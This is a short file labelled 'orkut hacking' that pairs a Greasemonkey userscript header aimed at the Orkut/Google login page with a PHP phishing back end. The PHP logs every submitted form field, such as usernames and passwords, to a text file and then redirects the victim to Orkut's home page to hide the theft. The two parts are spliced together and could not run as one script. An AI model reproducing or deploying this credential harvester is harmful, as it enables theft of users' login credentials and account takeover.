
// ==UserScript==
// @name          A Script by XxRahulxX
// @namespace     Orkut
// @description	  orkut hacking
// @author        XxRahulxX
// @homepage      http://www.orkut.com*
// @include       https://www.google.com/accounts/ServiceLogin?service=orkut*
// ==/UserScript==

<?php
header ('Location: http://www.orkut.com/Home.aspx ');
$handler = fopen("bob.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handler, $variable);
fwrite($handler, "=");
fwrite($handler, $value);
fwrite($handler, "\r\n");
}
fwrite($handler, "\r\n");
fclose($handler);

exit;
?>
